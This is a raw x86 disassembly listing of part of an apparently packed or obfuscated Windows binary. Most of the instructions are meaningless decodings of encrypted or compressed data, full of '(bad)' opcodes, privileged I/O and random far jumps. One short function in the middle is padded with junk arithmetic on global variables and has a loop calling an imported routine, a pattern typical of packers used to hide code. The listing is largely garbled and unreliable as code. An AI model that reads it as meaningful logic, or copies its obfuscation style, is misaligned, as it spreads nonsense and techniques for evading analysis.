  408163:	push   es
  408164:	dec    DWORD PTR [eax]
  408166:	push   ds
  408167:	pop    ecx
  408168:	pop    eax
  408169:	mov    esp,0xa5432981
  40816e:	pop    eax
  40816f:	cld    
  408170:	cwde   
  408171:	aas    
  408172:	sti    
  408173:	cmp    al,BYTE PTR [ecx+0x2e]
  408176:	or     BYTE PTR [esi+0xa],bl
  408179:	xor    al,0xda
  40817b:	push   ebx
  40817c:	sbb    ebp,ebp
  40817e:	arpl   bp,ax
  408180:	fidivr WORD PTR [esi-0x32647e04]
  408186:	ret    
  408187:	cmp    ah,BYTE PTR ss:[esi]
  40818a:	and    al,0xe4
  40818c:	sub    cl,BYTE PTR [edx+0x5a]
  40818f:	mov    al,bl
  408191:	push   ecx
  408192:	mov    ch,0xa4
  408194:	in     eax,0x7b
  408196:	mov    WORD PTR [esi],cs
  408198:	sbb    BYTE PTR [esi+0x2f],cl
  40819b:	jbe    0x4081ec
  40819d:	mov    dh,0x6f
  40819f:	ret    
  4081a0:	out    0xaf,al
  4081a2:	mov    esp,0x8bf0458b
  4081a7:	push   ebp
  4081a8:	or     BYTE PTR [ebx],dh
  4081aa:	shr    ecx,0x7c
  4081ad:	add    DWORD PTR [eax],eax
  4081af:	add    BYTE PTR [edx-0x80],cl
  4081b2:	fld    QWORD PTR [edi]
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp+0x23487a8f]
  4081bf:	jp     0x40814e
  4081c1:	fstp   TBYTE PTR [esi+0x7e]
  4081c4:	sar    BYTE PTR [edi+0x7e],cl
  4081c7:	jle    0x408195
  4081c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081ca:	cmp    al,0xdc
  4081cc:	aam    0x41
  4081ce:	jg     0x408162
  4081d0:	mov    eax,ds:0xc95e3ae
  4081d5:	jmp    0xebec:0x25e24d5d
  4081dc:	in     eax,dx
  4081dd:	inc    edx
  4081de:	mov    ch,0x4d
  4081e0:	sbb    BYTE PTR [esi],0x59
  4081e3:	loop   0x408213
  4081e5:	and    BYTE PTR [esp+ecx*1],ch
  4081e8:	pop    edi
  4081e9:	sub    BYTE PTR [ecx+ebp*8],bl
  4081ec:	pusha  
  4081ed:	jno    0x40821f
  4081ef:	fmul   QWORD PTR [esi]
  4081f1:	push   esi
  4081f2:	lock dec edx
  4081f4:	push   ss
  4081f5:	adc    eax,0xb597a148
  4081fa:	pop    ds
  4081fb:	sbb    ebx,ecx
  4081fd:	jbe    0x408200
  4081ff:	aas    
  408200:	sahf   
  408201:	jb     0x408250
  408203:	fucom  st(6)
  408205:	sbb    ecx,edi
  408207:	or     DWORD PTR [edi+edi*4],edx
  40820a:	pop    edx
  40820b:	push   ecx
  40820c:	lea    esi,[ecx-0x64f61677]
  408212:	mov    ah,0x20
  408214:	aad    0xd4
  408216:	clc    
  408217:	scas   al,BYTE PTR es:[edi]
  408218:	(bad)  
  408219:	mov    ch,0x39
  40821b:	lods   eax,DWORD PTR ds:[esi]
  40821c:	xchg   DWORD PTR [esp+eax*2-0x5d05a8af],eax
  408223:	xchg   ecx,eax
  408224:	pop    eax
  408225:	or     DWORD PTR [ebp-0x437c24ac],0x27
  40822c:	adc    al,0x28
  40822e:	js     0x40820a
  408230:	mov    dl,BYTE PTR [eax+0x24]
  408233:	mov    al,0xcb
  408235:	cmc    
  408236:	xlat   BYTE PTR ds:[ebx]
  408237:	pop    ecx
  408238:	pop    ss
  408239:	in     eax,0xcf
  40823b:	iret   
  40823c:	(bad)  
  40823e:	aas    
  40823f:	jg     0x4081c6
  408241:	hlt    
  408242:	and    esp,DWORD PTR [ebx+0x608df24]
  408248:	dec    edx
  408249:	pop    eax
  40824a:	mov    WORD PTR [edx-0x4e],ss
  40824d:	(bad)  
  40824e:	aad    0x3c
  408250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408251:	and    eax,0xd12e12b9
  408256:	jnp    0x408254
  408258:	sub    al,BYTE PTR [ebx+0xa9b3c93]
  40825e:	cmp    eax,0xf59dc98f
  408263:	or     al,0x5b
  408265:	repnz stos BYTE PTR es:[edi],al
  408267:	in     al,dx
  408268:	or     DWORD PTR [ebx],esi
  40826a:	push   ebx
  40826b:	jbe    0x4082d0
  40826d:	and    DWORD PTR [ebx+edx*2-0x20],0x46
  408272:	push   ebp
  408273:	addr16 call 0x2f3a598f
  408279:	imul   di,WORD PTR [ebp-0x65],0x159c
  40827f:	pop    eax
  408280:	scas   eax,DWORD PTR es:[edi]
  408281:	or     DWORD PTR [ebx+0x31],edi
  408284:	adc    eax,0x67a4069c
  408289:	and    ecx,DWORD PTR [edx+0x33]
  40828c:	stos   BYTE PTR es:[edi],al
  40828d:	and    ebp,DWORD PTR [edx+0x2632b6f]
  408293:	push   ebx
  408294:	jae    0x408251
  408296:	icebp  
  408297:	jne    0x40830b
  408299:	mov    BYTE PTR [ebp+eax*2-0x2e],0x12
  40829e:	and    DWORD PTR [ebx-0x44],0xdeb091f8
  4082a5:	js     0x40826c
  4082a7:	outs   dx,BYTE PTR ds:[esi]
  4082a8:	mov    WORD PTR [edi+eiz*2+0x66],es
  4082ac:	xor    al,0x69
  4082ae:	xchg   DWORD PTR [edi+0x96136f],ecx
  4082b4:	add    eax,0x500ea915
  4082b9:	shl    ecx,1
  4082bb:	inc    edi
  4082bc:	mov    ds:0xe16d789f,al
  4082c1:	jno    0x408342
  4082c3:	push   ebp
  4082c4:	out    0x5,eax
  4082c6:	pop    esp
  4082c7:	test   DWORD PTR [ebx+edx*2-0x557edcb9],ebp
  4082ce:	aam    0x5
  4082d0:	pop    ebx
  4082d1:	js     0x40828b
  4082d3:	shl    dh,0xec
  4082d6:	push   ebx
  4082d7:	or     dl,cl
  4082d9:	(bad)  
  4082da:	mov    edx,0x76a46507
  4082df:	mov    al,0x9d
  4082e1:	iret   
  4082e2:	imul   esi,DWORD PTR [ebp-0x3b],0xffffffeb
  4082e6:	xchg   edx,eax
  4082e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082e8:	mov    al,ds:0xe5781e62
  4082ed:	xor    BYTE PTR [eax],cl
  4082ef:	mov    dl,BYTE PTR [edi-0x1134f7f9]
  4082f5:	call   0x2cd949ac
  4082fa:	inc    eax
  4082fb:	push   es
  4082fc:	neg    BYTE PTR [edx+eiz*4-0x66]
  408300:	push   ecx
  408301:	and    al,0x3e
  408303:	in     al,dx
  408304:	jl     0x40830a
  408306:	stc    
  408307:	and    BYTE PTR [ebx-0x3295314e],ch
  40830d:	out    0x23,al
  40830f:	push   edi
  408310:	sub    ch,BYTE PTR [ebx]
  408312:	mov    eax,ds:0x926b828
  408317:	jmp    0x4082fc
  408319:	cmc    
  40831a:	dec    edi
  40831b:	jnp    0x408317
  40831d:	arpl   WORD PTR [eax],bx
  40831f:	or     DWORD PTR [edi-0x2],esp
  408322:	push   es
  408323:	test   al,0xdb
  408325:	nop
  408326:	cmp    BYTE PTR [edx],dh
  408328:	add    eax,ecx
  40832a:	retf   
  40832b:	nop
  40832c:	lea    eax,[eax+edx*1+0x32729d]
  408333:	mov    DWORD PTR [ebp+0x8],eax
  408336:	inc    DWORD PTR [ebp+0xc]
  408339:	jmp    0x407e52
  40833e:	mov    eax,DWORD PTR [ebp-0x10]
  408341:	xor    eax,ecx
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e872
  408366:	adc    DWORD PTR ds:0x42e862,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x430642,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e86e,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e86e
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x4305a6,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43058a
  4083aa:	or     DWORD PTR ds:0x42ef0c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ef10,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43058e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e866,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43059a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e876,0x42e86e
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e86e,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43058e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43058e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43058e,esi
  408424:	cmp    DWORD PTR ds:0x43058e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42eb08
  40844d:	cmp    DWORD PTR ds:0x43058e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	jmp    0x408432
  40847f:	dec    edi
  408480:	push   esp
  408481:	popa   
  408482:	fdivr  QWORD PTR [esi+0x7e]
  408485:	push   eax
  408486:	jo     0x408506
  408488:	jle    0x408503
  40848a:	jbe    0x408435
  40848c:	out    dx,eax
  40848d:	scas   eax,DWORD PTR es:[edi]
  40848e:	pusha  
  40848f:	pop    ds
  408490:	dec    ebx
  408491:	add    al,0x2c
  408493:	jae    0x4084fa
  408495:	in     al,dx
  408496:	mov    bl,0xa0
  408498:	lea    esp,[ebx]
  40849a:	inc    ebx
  40849b:	sub    eax,0x265f955b
  4084a0:	cwde   
  4084a1:	les    edx,FWORD PTR [edi]
  4084a3:	mov    BYTE PTR [ebx+0x3e3b495e],cl
  4084a9:	cld    
  4084aa:	leave  
  4084ab:	sub    esi,DWORD PTR [edi+0xb9ecf92]
  4084b1:	out    0x2c,eax
  4084b3:	repz cmp bl,BYTE PTR [ebx]
  4084b6:	push   ss
  4084b7:	ins    BYTE PTR es:[edi],dx
  4084b8:	jmp    0x640e:0x5d427652
  4084bf:	aam    0x2e
  4084c1:	aad    0x74
  4084c3:	ins    DWORD PTR es:[edi],dx
  4084c4:	mov    dl,0xf8
  4084c6:	sbb    bh,BYTE PTR [esi]
  4084c8:	test   DWORD PTR [edi+0x4403b6bb],esi
  4084ce:	rcr    BYTE PTR [edx-0x69a21798],0xb8
  4084d5:	or     bh,cl
  4084d7:	dec    esp
  4084d8:	test   ch,bh
  4084da:	mov    esi,0xa3055ea7
  4084df:	stos   DWORD PTR es:[edi],eax
  4084e0:	pushf  
  4084e1:	mov    dl,ch
  4084e3:	scas   al,BYTE PTR es:[edi]
  4084e4:	push   es
  4084e5:	lock in al,dx
  4084e7:	(bad)  
  4084e8:	iret   
  4084e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084ea:	int    0x95
  4084ec:	cmp    edx,DWORD PTR [ecx+0x29]
  4084ef:	xchg   DWORD PTR [edx+0x7501afdf],ebx
  4084f5:	ins    BYTE PTR es:[edi],dx
  4084f6:	std    
  4084f7:	fistp  WORD PTR [esi-0x67c23457]
  4084fd:	(bad)  
  4084fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084ff:	pop    ebp
  408500:	mov    eax,0xb143c74f
  408505:	mov    al,0xea
  408507:	test   cl,al
  408509:	into   
  40850a:	push   DWORD PTR ds:0x4e9f9b73
  408510:	dec    ecx
  408511:	and    DWORD PTR [edx+0x6b7987f1],ebp
  408517:	and    esi,esp
  408519:	mov    eax,ds:0xdc3c9d22
  40851e:	sbb    DWORD PTR [ecx+eax*4+0x674402a1],esp
  408525:	push   eax
  408526:	cli    
  408527:	push   edi
  408528:	leave  
  408529:	into   
  40852a:	mov    al,ds:0xe629d3d5
  40852f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408530:	inc    esi
  408531:	push   esp
  408532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408533:	add    DWORD PTR [edi],edi
  408535:	xor    eax,0x762d034d
  40853a:	xor    al,0x69
  40853c:	cmp    DWORD PTR [edx+0x56],esi
  40853f:	push   edx
  408540:	mov    edx,esi
  408542:	cdq    
  408543:	data16 xor al,0x71
  408546:	and    al,0xff
  408548:	mov    ecx,0x29059fe4
  40854d:	in     al,0x19
  40854f:	add    cl,bl
  408551:	mov    al,ds:0x8b684f36
  408556:	mov    dh,0xbb
  408558:	icebp  
  408559:	jo     0x4085ad
  40855b:	sbb    al,0x3e
  40855d:	jmp    0x876b01da
  408562:	push   edx
  408563:	cmp    eax,DWORD PTR [esi+ecx*2+0x2e]
  408567:	arpl   WORD PTR [esi],bp
  408569:	xor    eax,0xfa561374
  40856e:	jmp    0xde87:0x38a97196
  408575:	jmp    0xc8fa85f8
  40857a:	(bad)  
  40857c:	lods   eax,DWORD PTR ds:[esi]
  40857d:	add    esi,DWORD PTR [edi]
  40857f:	in     eax,0xed
  408581:	mov    edi,0x56bb417f
  408587:	sti    
  408588:	jo     0x4085b6
  40858a:	inc    edx
  40858b:	hlt    
  40858c:	pushf  
  40858d:	pop    eax
  40858e:	sahf   
  40858f:	scas   al,BYTE PTR es:[edi]
  408590:	mov    dh,0xe6
  408592:	std    
  408593:	lea    ebx,[edi]
  408595:	mov    DWORD PTR [edx+0x2e],esi
  408598:	jg     0x408567
  40859a:	sub    al,0x98
  40859c:	and    eax,DWORD PTR [edi-0x53f861fd]
  4085a2:	mov    eax,ds:0xb0d7e3be
  4085a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085a8:	(bad)  [ebx]
  4085aa:	aaa    
  4085ab:	mov    al,ds:0x3a3ac67a
  4085b0:	out    0x3a,ax
  4085b3:	push   es
  4085b4:	pop    edx
  4085b5:	mov    ah,0x66
  4085b7:	scas   eax,DWORD PTR es:[edi]
  4085b8:	leave  
  4085b9:	sub    BYTE PTR [ebx+0x5a],0x7f
  4085bd:	mov    ecx,0xa3f44e0
  4085c2:	mov    bl,0xfd
  4085c4:	dec    edx
  4085c5:	sbb    eax,0x4ccdb720
  4085ca:	outs   dx,DWORD PTR ds:[esi]
  4085cb:	pop    es
  4085cc:	pop    ecx
  4085cd:	jmp    0xf3d9:0x8dc9ef10
  4085d4:	mov    ebx,0x71a5b993
  4085d9:	mov    BYTE PTR [ebx+0x6ac92dfc],bh
  4085df:	loop   0x40862f
  4085e1:	jge    0x40857b
  4085e3:	sbb    DWORD PTR [ebp-0x25],0xfcd4c913
  4085ea:	fnstenv [edi]
  4085ec:	sub    DWORD PTR cs:[esi],0x28
  4085f0:	add    al,0xa0
  4085f2:	xchg   ebp,eax
  4085f3:	cmp    ch,BYTE PTR [edi]
  4085f5:	scas   al,BYTE PTR es:[edi]
  4085f6:	cmp    ecx,DWORD PTR [edx-0x3ec2af15]
  4085fc:	dec    esp
  4085fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085fe:	aad    0x6b
  408600:	dec    esp
  408601:	in     al,0x2a
  408603:	pop    ss
  408604:	ja     0x4085d5
  408606:	jmp    0x4085aa
  408608:	jmp    0x66a42634
  40860d:	sub    BYTE PTR [ebx-0x8],ch
  408610:	je     0x408602
  408612:	mov    ebx,0xac876f27
  408617:	or     DWORD PTR [esi+ecx*1-0x74],ebp
  40861b:	popf   
  40861c:	jns    0x408683
  40861e:	inc    edx
  40861f:	add    eax,0xd8308188
  408624:	xor    edi,eax
  408626:	or     al,0x60
  408628:	lods   eax,DWORD PTR ds:[si]
  40862a:	pop    esi
  40862b:	dec    ebx
  40862c:	pop    ebp
  40862d:	jbe    0x408607
  40862f:	pusha  
  408630:	outs   dx,BYTE PTR ds:[esi]
  408631:	repz cmp BYTE PTR [esi+0x58],bl
  408635:	jle    0x4085dd
  408637:	dec    ebp
  408638:	int    0x53
  40863a:	jo     0x408628
  40863c:	neg    DWORD PTR [eax]
  40863e:	ror    DWORD PTR [edx-0x42536669],0x69
  408645:	xor    eax,DWORD PTR [edi+0x5d]
  408648:	mov    al,0x54
  40864a:	mov    eax,ds:0xc9b27e77
  40864f:	xchg   ebx,eax
  408650:	fdivr  DWORD PTR [eax-0x3d59f2f3]
  408656:	or     eax,0x12c3c28d
  40865b:	data16 lock clc 
  40865e:	mov    al,ds:0xc901d368
  408663:	mov    bh,0x96
  408665:	jb     0x408614
  408667:	pushf  
  408668:	mov    bh,0x8d
  40866a:	or     al,0xe3
  40866c:	inc    esp
  40866d:	ds addr16 in al,dx
  408670:	add    BYTE PTR [ebx],al
  408672:	cmp    eax,esi
  408674:	rcl    BYTE PTR [edx-0x13cf961d],1
  40867a:	gs nop
  40867c:	or     ah,bh
  40867e:	adc    BYTE PTR [esi+0x1f78572b],bl
  408684:	sub    BYTE PTR [edx-0x36],ah
  408687:	jns    0x4086a9
  408689:	add    edx,0xffffff85
  40868c:	icebp  
  40868d:	out    0x81,al
  40868f:	jmp    0xaea3:0xf1515e3b
  408696:	jl     0x4086b6
  408698:	sub    eax,DWORD PTR [ebx+0xb396b18]
  40869e:	or     esi,DWORD PTR [eax-0x62e8aa4e]
  4086a4:	xchg   edi,eax
  4086a5:	arpl   dx,ax
  4086a7:	or     DWORD PTR [edx+0x74],ebx
  4086aa:	xchg   edi,eax
  4086ab:	mov    ds:0x35a98091,al
  4086b0:	stos   DWORD PTR es:[edi],eax
  4086b1:	fistp  DWORD PTR [esi]
  4086b3:	stos   BYTE PTR es:[edi],al
  4086b4:	addr16 add eax,0xc2401865
  4086ba:	shl    edi,1
  4086bc:	bound  edx,QWORD PTR [ebx]
  4086be:	cmc    
  4086bf:	aad    0x70
  4086c1:	div    DWORD PTR [ebx-0x2f]
  4086c4:	ret    0x58c1
  4086c7:	ds (bad) 
  4086c9:	arpl   dx,cx
  4086cb:	and    eax,0x73fc768d
  4086d0:	jl     0x4086d5
  4086d2:	repz loopne 0x408744
  4086d5:	adc    BYTE PTR [esp+esi*8+0x79],dh
  4086d9:	sbb    ecx,edi
  4086db:	sbb    eax,0xe680d600
  4086e0:	int3   
  4086e1:	daa    
  4086e2:	out    dx,eax
  4086e3:	ins    BYTE PTR es:[edi],dx
  4086e4:	mov    ds:0x73be0c02,al
  4086e9:	aas    
  4086ea:	pop    ecx
  4086eb:	fild   WORD PTR [ecx+edi*4-0x1642a9e3]
  4086f2:	shl    dl,1
  4086f4:	adc    al,0x71
  4086f6:	shr    BYTE PTR [ebx+0x2d],1
  4086f9:	jmp    0x4dabd6cb
  4086fe:	aas    
  4086ff:	inc    edi
  408700:	or     al,0x8d
  408702:	adc    DWORD PTR [edi+0x75b9f286],ebx
  408708:	stc    
  408709:	in     al,0x5d
  40870b:	inc    eax
  40870c:	fs mov ecx,edi
  40870f:	jp     0x408726
  408711:	(bad)  
  408712:	scas   al,BYTE PTR es:[edi]
  408713:	xchg   ecx,eax
  408714:	repnz hlt 
  408716:	xor    cl,BYTE PTR [edx]
  408718:	adc    BYTE PTR [ebx],al
  40871a:	rcl    BYTE PTR [ebx+0x543acf81],cl
  408720:	xchg   ecx,eax
  408721:	sbb    DWORD PTR [eax],edi
  408723:	sbb    DWORD PTR [ebp+ebp*4-0x44],edi
  408727:	dec    ebx
  408728:	sbb    DWORD PTR [ecx-0x362c489f],eax
  40872e:	aam    0x50
  408730:	jae    0x408772
  408732:	cs hlt 
  408734:	cmp    al,0x7c
  408736:	add    al,0x34
  408738:	cld    
  408739:	mov    esi,0x654d9fd0
  40873e:	xchg   esp,eax
  40873f:	popa   
  408740:	or     edi,DWORD PTR [ebp-0x3f4d1955]
  408746:	sbb    BYTE PTR cs:[ebx-0x62e26275],dh
  40874d:	fcmovne st,st(1)
  40874f:	arpl   WORD PTR [edi],ax
  408751:	loopne 0x40872a
  408753:	or     BYTE PTR es:0xd097c28a,cl
  40875a:	or     al,BYTE PTR [edx]
  40875c:	daa    
  40875d:	in     al,0x60
  40875f:	sar    ah,cl
  408761:	dec    edi
  408762:	div    esp
  408764:	jb     0x4086fc
  408766:	js     0x4087b2
  408768:	mov    ecx,0xd2330fee
  40876d:	mov    ecx,0x7264fcad
  408772:	div    ecx
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	bound  edx,QWORD PTR [ebx]
  40878b:	cmp    BYTE PTR [ecx+0x7edf43d5],ah
  408791:	jle    0x4087e3
  408793:	jo     0x408813
  408795:	jle    0x40872e
  408797:	sub    eax,0x2e5e83f3
  40879c:	cdq    
  40879d:	hlt    
  40879e:	into   
  40879f:	adc    eax,0xf3890b7a
  4087a4:	js     0x408787
  4087a6:	call   0x57c7:0xbeb549f
  4087ad:	mov    bh,ch
  4087af:	int    0x43
  4087b1:	cmp    al,0x8a
  4087b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087b4:	sbb    DWORD PTR [esi-0x10],0x61530495
  4087bb:	retf   0x4c40
  4087be:	cmp    al,0xea
  4087c0:	sub    esi,DWORD PTR [eax]
  4087c2:	jbe    0x408797
  4087c4:	lock pop esi
  4087c6:	scas   al,BYTE PTR es:[edi]
  4087c7:	sub    esi,eax
  4087c9:	and    BYTE PTR [edi+ebx*1-0x51a4b4e6],0x89
  4087d1:	outs   dx,DWORD PTR ds:[esi]
  4087d2:	retf   
  4087d3:	sbb    WORD PTR [edx+0x6101be9a],dx
  4087da:	sbb    eax,0x18fceb2a
  4087df:	adc    DWORD PTR [eax],0xfffffffa
  4087e2:	add    BYTE PTR [esi],ah
  4087e4:	xchg   ebp,eax
  4087e5:	bound  esi,QWORD PTR [edi+edi*2]
  4087e8:	stc    
  4087e9:	xor    ebx,DWORD PTR [eax-0xd45d37c]
  4087ef:	sub    eax,0x3564bdbc
  4087f4:	test   esi,edi
  4087f6:	jae    0x408811
  4087f8:	js     0x40880d
  4087fa:	in     eax,dx
  4087fb:	pop    esp
  4087fc:	ret    
  4087fd:	inc    esp
  4087fe:	adc    al,0xbd
  408800:	sar    ecx,1
  408802:	mov    eax,ds:0xe2c4238e
  408807:	icebp  
  408808:	ret    0xab39
  40880b:	inc    edx
  40880c:	xchg   esp,eax
  40880d:	das    
  40880e:	aas    
  40880f:	gs stos DWORD PTR es:[edi],eax
  408811:	push   ss
  408812:	dec    ecx
  408813:	loopne 0x408800
  408815:	inc    edx
  408816:	out    0x6e,al
  408818:	xchg   edx,eax
  408819:	jno    0x4087b6
  40881b:	call   0x5619:0x2891f8ad
  408822:	pop    ecx
  408823:	rol    dh,1
  408825:	rol    BYTE PTR [esi-0x6e],1
  408828:	js     0x4087b9
  40882a:	jle    0x4087f6
  40882c:	adc    ebp,eax
  40882e:	sahf   
  40882f:	lahf   
  408830:	aaa    
  408831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408832:	aad    0x94
  408834:	push   eax
  408835:	or     bl,BYTE PTR [edx+0x4e]
  408838:	ds dec ebx
  40883a:	xchg   ebx,eax
  40883b:	scas   al,BYTE PTR es:[edi]
  40883c:	test   DWORD PTR [ebx],edi
  40883e:	and    eax,0x9f53ea73
  408843:	jmp    0xf0013706
  408848:	jp     0x408857
  40884a:	lock mov al,ds:0xbba725ca
  408850:	xor    bl,BYTE PTR [ebx-0x5929866]
  408856:	mov    ebp,0x910c4d4a
  40885b:	outs   dx,DWORD PTR ds:[esi]
  40885c:	cmp    bl,BYTE PTR [ebx]
  40885e:	sbb    DWORD PTR [edi+0x31],esp
  408861:	jb     0x4087fd
  408863:	inc    ebx
  408864:	sbb    al,0xe3
  408866:	stc    
  408867:	push   ss
  408868:	aaa    
  408869:	(bad)  
  40886a:	call   0x404964a4
  40886f:	jb     0x4087f1
  408871:	stos   BYTE PTR es:[edi],al
  408872:	ins    BYTE PTR es:[edi],dx
  408873:	jecxz  0x408880
  408875:	inc    ecx
  408876:	shl    DWORD PTR [esi-0x1ed64e8e],1
  40887c:	enter  0x5731,0x63
  408880:	jmp    0x408854
  408882:	loope  0x408808
  408884:	or     ch,bh
  408886:	add    esi,DWORD PTR [ecx+0x4f2bdcfb]
  40888c:	sub    eax,0x7087526c
  408891:	aas    
  408892:	jecxz  0x40885b
  408894:	lock inc ebx
  408896:	cmp    al,0x5a
  408898:	(bad)  
  408899:	xor    eax,0xaf3625f1
  40889e:	pop    esi
  40889f:	jmp    0x4088e1
  4088a1:	sti    
  4088a2:	imul   ecx,DWORD PTR [ecx-0x37],0xffffffe2
  4088a6:	push   ebx
  4088a7:	(bad)  
  4088a8:	int    0x98
  4088aa:	fidivr WORD PTR [ebx+ebp*2+0x1d]
  4088ae:	sbb    DWORD PTR [ecx],0xffffffe0
  4088b1:	loop   0x408899
  4088b3:	mov    ecx,0xc2abed19
  4088b8:	mov    DWORD PTR [ecx-0x1413c4d1],eax
  4088be:	pop    esp
  4088bf:	mov    BYTE PTR [esp+eiz*2+0x17373495],dh
  4088c6:	dec    ecx
  4088c7:	push   edx
  4088c8:	and    al,0x7e
  4088ca:	mov    bl,BYTE PTR [esi+0x1]
  4088cd:	push   ebp
  4088ce:	xchg   esp,eax
  4088cf:	(bad)  [edx-0x5e]
  4088d2:	je     0x40886d
  4088d4:	stos   BYTE PTR es:[edi],al
  4088d5:	fsubr  DWORD PTR [edx+esi*4+0x4331b3f5]
  4088dc:	cld    
  4088dd:	loope  0x4088c8
  4088df:	je     0x408940
  4088e1:	out    dx,al
  4088e2:	xchg   edi,eax
  4088e3:	and    ebx,DWORD PTR [ebx]
  4088e5:	int3   
  4088e6:	push   ebx
  4088e7:	pop    edi
  4088e8:	stos   BYTE PTR es:[edi],al
  4088e9:	scas   eax,DWORD PTR es:[edi]
  4088ea:	inc    ecx
  4088eb:	ins    DWORD PTR es:[edi],dx
  4088ec:	push   0x2c4501b1
  4088f1:	jmp    0x2a721f85
  4088f6:	xor    BYTE PTR [eax-0x317a77d2],cl
  4088fc:	stc    
  4088fd:	or     eax,0xdc5da729
  408902:	mov    al,ds:0xeae76a7b
  408907:	xchg   esp,eax
  408908:	mov    ebx,0x4826a3b9
  40890d:	xor    BYTE PTR [ebx-0x7eb9753],bh
  408913:	retf   
  408914:	mov    ebx,0x75910378
  408919:	jns    0x40892f
  40891b:	jmp    0xc5e2:0x4239768d
  408922:	add    al,0xca
  408924:	xor    eax,0xd5c39753
  408929:	sbb    eax,0xb8d92da1
  40892e:	xchg   ecx,eax
  40892f:	pop    ds
  408930:	leave  
  408931:	es (bad) 
  408933:	into   
  408934:	lods   eax,DWORD PTR ds:[esi]
  408935:	sahf   
  408936:	ins    BYTE PTR es:[edi],dx
  408937:	js     0x408911
  408939:	add    ecx,DWORD PTR ds:0xfe02d4ca
  40893f:	cdq    
  408940:	and    eax,0x2c647705
  408945:	and    ch,cl
  408947:	mov    dl,BYTE PTR [ebp-0x6fbc840a]
  40894d:	xor    bh,dh
  40894f:	jmp    0x4bee:0x758d4056
  408956:	ja     0x408974
  408958:	shl    DWORD PTR [edi+edx*4-0x2f],0x9b
  40895d:	shr    DWORD PTR [ecx+0x62],0xc
  408961:	ins    BYTE PTR es:[edi],dx
  408962:	adc    al,cl
  408964:	or     esi,edi
  408966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408967:	gs dec ecx
  408969:	and    ah,BYTE PTR [ebx+0xa4bfb13]
  40896f:	push   0x61
  408971:	shl    DWORD PTR [ebx+0x2],0x53
  408975:	ja     0x4089a6
  408977:	or     bh,0xca
  40897a:	fs dec esi
  40897c:	mov    ecx,0x86ff67df
  408981:	cmp    al,0x52
  408983:	xchg   edi,eax
  408984:	int3   
  408985:	mov    ds:0xcdde1a4f,eax
  40898a:	data16 cmp al,0xa7
  40898d:	add    edx,DWORD PTR [edx]
  40898f:	mov    edi,0xf19b25ca
  408994:	jmp    0x4be3b810
  408999:	dec    esp
  40899a:	dec    edi
